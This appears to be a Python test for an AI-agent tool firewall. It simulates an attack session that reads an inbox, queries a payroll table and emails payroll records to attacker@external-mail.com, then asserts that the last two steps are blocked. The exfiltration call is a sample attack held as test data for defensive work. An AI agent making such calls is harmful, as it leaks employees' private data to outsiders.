from models.schemas import ToolRequest
from firewall.interceptor import FirewallInterceptor


firewall = FirewallInterceptor()

session_id = "SECURED_ATTACK_001"
user_id = "U001"


# ---------------------------------------------------------
# STEP 1: Read email inbox
# ---------------------------------------------------------

request1 = ToolRequest(
    request_id="SECURED_ATTACK_001-REQ001",
    session_id=session_id,
    user_id=user_id,
    tool="read_email_inbox",
    arguments={
        "user_email": "alice@company.com"
    }
)

decision1, result1 = firewall.execute(request1)

print("STEP 1 DECISION:")
print(decision1)
print()


# ---------------------------------------------------------
# STEP 2: Attempt payroll access
# ---------------------------------------------------------

request2 = ToolRequest(
    request_id="SECURED_ATTACK_001-REQ002",
    session_id=session_id,
    user_id=user_id,
    tool="query_database",
    arguments={
        "table": "payroll"
    }
)

decision2, result2 = firewall.execute(request2)

print("STEP 2 DECISION:")
print(decision2)
print()


# ---------------------------------------------------------
# STEP 3: Attempt external exfiltration
# ---------------------------------------------------------

request3 = ToolRequest(
    request_id="SECURED_ATTACK_001-REQ003",
    session_id=session_id,
    user_id=user_id,
    tool="send_email_message",
    arguments={
        "sender": "alice@company.com",
        "recipient": "attacker@external-mail.com",
        "subject": "Payroll Records",
        "body": "Payroll information"
    }
)

decision3, result3 = firewall.execute(request3)

print("STEP 3 DECISION:")
print(decision3)
print()


# ---------------------------------------------------------
# Verify security behavior
# ---------------------------------------------------------

assert decision1.action == "ALLOW"

assert decision2.action == "BLOCK"

assert result2 is None

assert decision3.action == "BLOCK"

assert result3 is None


print("SECURED ATTACK BLOCKED SUCCESSFULLY")